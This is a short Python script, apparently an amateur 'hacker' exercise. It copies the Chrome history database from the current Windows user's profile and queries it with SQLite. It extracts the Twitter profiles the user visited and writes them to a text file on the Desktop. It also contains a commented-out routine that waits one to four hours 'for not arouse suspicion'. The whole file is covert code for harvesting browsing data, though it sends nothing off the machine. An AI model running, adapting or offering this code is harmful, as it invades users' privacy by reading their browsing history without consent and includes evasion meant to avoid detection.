import os
import re
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re

FILE_NAME = "Daru.txt"

def main():
    # We will wait between one and four hours. For not arouse suspicion.
    # delay_action()

    # Get the partition of the disk in what is installed windows. Username and exact direction too.
    user_path = get_userpath()

    #Getting the historial in Google Chrome.
    chrome_history = get_chrome_history(user_path)

    #Creation of a file in Desktop.
    hacker_file = create_file(user_path)
    hacking(hacker_file, chrome_history)


def hacking(file, history):
    profile_visited = []
    for item in history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[1 ])
        if results and results[0] not in ["notifications", "home"]:
            profile_visited.append(results[0])
    file.write("You accessed to the perfil of this people: {}".format(", ".join(profile_visited)))


def get_userpath():
    return "{}/".format(Path.home())


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path,temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            return urls

        except sqlite3.OperationalError:
            print("Waiting.")
            sleep(3)



def create_file(user_path):
    hacker_file = open(user_path + "Desktop/{}".format(FILE_NAME), "w")
    return hacker_file


def delay_action():
    number_hours = randrange(1, 4)
    number_minutes= randrange(0, 60)
    hours = number_hours * 60 * 60
    minutes = number_minutes * 60
    total_time_sleep = hours + minutes
    print("Hours: {}".format(hours/3600) + " Minutes: {}".format(minutes/60) + " Total time: {}".format(total_time_sleep) + " seconds.")
    sleep(total_time_sleep)


if __name__ == '__main__':
    main()